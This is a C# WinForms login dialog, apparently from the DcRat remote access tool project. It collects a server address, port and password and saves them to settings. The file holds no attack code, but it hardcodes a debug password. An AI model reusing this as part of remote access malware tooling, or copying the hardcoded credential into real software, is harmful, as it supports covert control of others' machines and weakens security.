using DcRat.Properties;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DcRat
{
    public partial class FormInit : Form
    {
        public FormInit()
        {
            InitializeComponent();
        }

        private void buttonclose_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        private void buttonconnect_Click(object sender, EventArgs e)
        {
            if (textBoxasddress.Text==""||textBoxpassword.Text=="")
            {
                MessageBox.Show("Please fill in your address and password");
            }
            else
            {
                string[] address = textBoxasddress.Text.Split(new[] { ":" }, StringSplitOptions.None);
                Settings.Default.IP = address[0];
                Settings.Default.Port = address[1];
                Settings.Default.connectpassword = textBoxpassword.Text;
                this.Close();
            }
        }

        private void FormInit_Load(object sender, EventArgs e)
        {
#if DEBUG
            textBoxasddress.Text = "127.0.0.1:8848";
            textBoxpassword.Text="qwqdanchun";
#endif
        }

        #region Move
        [DllImport("user32.dll")]
        public static extern bool ReleaseCapture();
        [DllImport("user32.dll")]
        public static extern bool SendMessage(IntPtr hwnd, int wMsg, int wParam, int lParam);
        public const int WM_SYSCOMMAND = 0x0112;
        public const int SC_MOVE = 0xF010;
        public const int HTCAPTION = 0x0002;
        private void paneltop_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(this.Handle, WM_SYSCOMMAND, SC_MOVE + HTCAPTION, 0);
        }
        private void labelDcRat_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(this.Handle, WM_SYSCOMMAND, SC_MOVE + HTCAPTION, 0);
        }
        #endregion
    }
}
